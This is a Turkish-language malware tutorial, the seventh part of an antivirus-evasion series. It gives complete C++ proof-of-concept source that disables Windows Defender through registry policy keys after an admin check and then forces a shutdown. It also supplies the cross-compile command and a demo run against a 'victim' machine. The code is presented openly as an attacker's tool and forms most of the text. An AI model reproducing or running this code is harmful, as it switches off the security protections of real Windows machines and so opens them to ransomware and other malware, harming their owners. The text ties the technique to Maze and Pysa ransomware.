\newpage
\subsection{60. Kötü amaçlı yazılım AV atlatma: bölüm 7. Windows Defender'ı devre dışı bırakma. Basit C++ örneği.}

﷽

![av](./images/57/2022-06-05_12-21.png){width="80%"}    

Bu gönderi, vahşi doğadaki kötü amaçlı yazılımlarda en yaygın kullanılan tekniklerden birinin kendi araştırılmalarımın sonucudur.    

### windows defender

Kötü amaçlı yazılımdan koruma yazılımı Windows Defender (şu anda Microsoft Defender Antivirus olarak biliniyor), bilgisayarınızı dış tehditlerden korur. Microsoft, `Windows 10` bilgisayarlarını virüs tehditlerinden korumak için bu antivirüsü geliştirdi.    

Bu antivirüs, tüm `Windows 10` sürümlerine önceden yüklenmiş olarak gelir.     

Kötü amaçlı yazılımlarını/araçlarını ve faaliyetlerini olası tespitlerden kaçınmak için, saldırganlar güvenlik araçlarını değiştirebilir veya devre dışı bırakabilir. örneğin, Windows Defender.    

### pratik örnek

Windows Defender Antivirüs'ü Windows kayıt defterini değiştirerek devre dışı bırakmayı deneyelim.Öncelikle, devre dışı bırakmanın yönetici hakları gerektirdiğini unutmamak önemlidir.Windows Defender Antivirüs etkin modda olduğunda, cihazın birincil antivirüs programı olarak hizmet eder. Tehditler düzeltilir ve tespit edilen tehditler, güvenlik raporlarında ve Windows Güvenlik uygulamasında listelenir.    

Tüm bunları devre dışı bırakmak için sadece kayıt defteri anahtarlarını değiştirmeniz yeterlidir:    

```cpp
LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
"SOFTWARE\\Policies\\Microsoft\\Windows Defender", 
0, KEY_ALL_ACCESS, &key);
if (res == ERROR_SUCCESS) {
  RegSetValueEx(key, "DisableAntiSpyware", 0, 
  REG_DWORD, (const BYTE*)&disable, sizeof(disable));
  RegCreateKeyEx(key, "Real-Time Protection", 0, 0, 
  REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &new_key, 0);
  RegSetValueEx(new_key, "DisableRealtimeMonitoring", 0, 
  REG_DWORD, (const BYTE*)&disable, sizeof(disable));
  RegSetValueEx(new_key, "DisableBehaviorMonitoring", 0, 
  REG_DWORD, (const BYTE*)&disable, sizeof(disable));
  RegSetValueEx(new_key, "DisableScanOnRealtimeEnable", 0, 
  REG_DWORD, (const BYTE*)&disable, sizeof(disable));
  RegSetValueEx(new_key, "DisableOnAccessProtection", 0, 
  REG_DWORD, (const BYTE*)&disable, sizeof(disable));
  RegSetValueEx(new_key, "DisableIOAVProtection", 0, 
  REG_DWORD, (const BYTE*)&disable, sizeof(disable));

  RegCloseKey(key);
  RegCloseKey(new_key);
}
```

Ancak, daha önce belirttiğim gibi, bu yönetici hakları gerektirir, bu yüzden bunu kontrol eden bir fonksiyon oluşturuyoruz:    

```cpp
// check for admin rights
bool isUserAdmin() {
  bool isElevated = false;
  HANDLE token;
  TOKEN_ELEVATION elev;
  DWORD size;
  if (OpenProcessToken(GetCurrentProcess(), 
  TOKEN_QUERY, &token)) {
    if (GetTokenInformation(token, TokenElevation, 
    &elev, sizeof(elev), &size)) {
       isElevated = elev.TokenIsElevated;
    }
  }
  if (token) {
    CloseHandle(token);
    token = NULL;
  }
  return isElevated;
}
```

Windows Vista'dan bu yana, UAC (Kullanıcı Hesabı Denetimi), ayrıcalık yükseltme ile ilgili bazı riskleri azaltmak için kritik bir özellik olmuştur. UAC altında, yerel Yöneticiler grubu hesapları iki erişim belirtecine sahiptir: biri standart kullanıcı ayrıcalıklarıyla, diğeri yönetici ayrıcalıklarıyla. Tüm işlemler (Windows gezgini - `explorer.exe` dahil) standart belirteç kullanılarak başlatılır, bu da sürecin haklarını ve ayrıcalıklarını kısıtlar. Kullanıcı, *"Yönetici olarak çalıştır"* seçeneğini seçerek süreci yönetici ayrıcalıklarıyla çalıştırabilir.     

Bir komut dosyası veya çalıştırılabilir dosya, genellikle standart kullanıcı belirteciyle çalıştırılır, "Yönetici olarak çalıştır" komutu verilmediği sürece yükseltilmiş ayrıcalık modunda çalıştırılmaz. Bir geliştirici veya hacker olarak hangi modda çalıştığınızı anlamak önemlidir.     

Yani, Windows Defender'ı devre dışı bırakmak için tam PoC betiği şöyle bir şey:    

```cpp
/*
hack.cpp
disable windows defender dirty PoC
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/06/05/malware-av-evasion-7.html
*/

#include <cstdio>
#include <windows.h>

// check for admin rights
bool isUserAdmin() {
  bool isElevated = false;
  HANDLE token;
  TOKEN_ELEVATION elev;
  DWORD size;
  if (OpenProcessToken(GetCurrentProcess(), 
  TOKEN_QUERY, 
  &token)) {
    if (GetTokenInformation(token, TokenElevation, 
    &elev, sizeof(elev), &size)) {
       isElevated = elev.TokenIsElevated;
    }
  }
  if (token) {
    CloseHandle(token);
    token = NULL;
  }
  return isElevated;
}

// disable defender via registry
int main(int argc, char* argv[]) {
  HKEY key;
  HKEY new_key;
  DWORD disable = 1;

  if (!isUserAdmin()) {
    printf("please, run as admin.\n");
    return -1;
  }

  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
  "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, 
  KEY_ALL_ACCESS, &key);
  if (res == ERROR_SUCCESS) {
    RegSetValueEx(key, "DisableAntiSpyware", 0, 
    REG_DWORD, (const BYTE*)&disable, sizeof(disable));
    RegCreateKeyEx(key, "Real-Time Protection", 0, 
    0, REG_OPTION_NON_VOLATILE, 
    KEY_ALL_ACCESS, 0, &new_key, 0);
    RegSetValueEx(new_key, "DisableRealtimeMonitoring", 
    0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
    RegSetValueEx(new_key, "DisableBehaviorMonitoring", 
    0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
    RegSetValueEx(new_key, "DisableScanOnRealtimeEnable", 
    0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
    RegSetValueEx(new_key, "DisableOnAccessProtection", 
    0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
    RegSetValueEx(new_key, "DisableIOAVProtection", 
    0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));

    RegCloseKey(key);
    RegCloseKey(new_key);
  }

  printf("perfectly disabled :)\n");
  printf("press any key to restart to apply them.\n");
  system("pause");
  system("C:\\Windows\\System32\\shutdown /s /t 0");
  return 1;
}
```

### demo

Her şeyi aksiyonda görelim. Öncelikle, Defender'ımızı kontrol edelim:     

![av](./images/57/2022-06-05_12-19.png){width="80%"}    

Ve kayıt defteri anahtarlarını inceleyelim:    

```powershell
reg query "HKLM\Software\Policies\Microsoft\Windows Defender" /s
```

![av](./images/57/2022-06-05_12-15.png){width="80%"}    

Gördüğünüz gibi, standart kayıt defteri anahtarlarımız var.    

Ardından, saldırganın makinesinde betiğimizi derleyelim:    

```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![av](./images/57/2022-06-05_12-03.png){width="80%"}    

Ve kurbanın makinesinde çalıştıralım:    

```powershell
.\hack.exe
```

![av](./images/57/2022-06-05_12-17.png){width="80%"}    

Programın mantığına göre, makine kapanıyor. Sonra tekrar açıp kontrol ediyoruz:    

```powershell
reg query "HKLM\Software\Policies\Microsoft\Windows Defender" /s
```

![av](./images/57/2022-06-05_12-20.png){width="80%"}    

![av](./images/57/2022-06-05_12-20_1.png){width="80%"}    

Windows Defender Güvenlik Merkezi üzerinden de doğrulayalım:    

![av](./images/57/2022-06-05_12-22.png){width="80%"}    

![av](./images/57/2022-06-05_13-17.png){width="80%"}    

Gördüğünüz gibi, her şey mükemmel çalıştı!    

Ancak, bu teknik yeni değil. Günümüzde saldırganlar, güvenlik araçları tarafından dağıtılan ve kullanılan artefaktları değiştirebilir. Güvenlik ürünleri, veri toplamayı kolaylaştırmak için kendi modüllerini yükleyebilir ve/veya süreçler tarafından yüklenenleri değiştirebilir.    

Saldırganlar, bu araçlar tarafından eklenen özellikleri devre dışı bırakabilir veya değiştirebilir ve böylece tespitten kaçınabilir.   

Bu teknik, [Maze](https://attack.mitre.org/software/S0449/) ve [Pysa](https://attack.mitre.org/software/S0449/) fidye yazılımları tarafından vahşi doğada kullanılmıştır.

Bir sonraki bölümde, antivirüs sürecinin ayrıcalıklarını elinden alarak kötü amaçlı yazılım taramalarını nasıl engelleyebileceğimi araştıracağım.     

[MITRE ATT&CK. Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)    
[Gorgon Group](https://attack.mitre.org/groups/G0078/)    
[H1N1 Malware](https://attack.mitre.org/software/S0132/)    
[Maze ransomware](https://attack.mitre.org/software/S0449/)    
[Pysa ransomware](https://attack.mitre.org/software/S0449/)     
[github'taki kaynak kod](https://github.com/cocomelonc/2022-06-05-malware-av-evasion-7)    
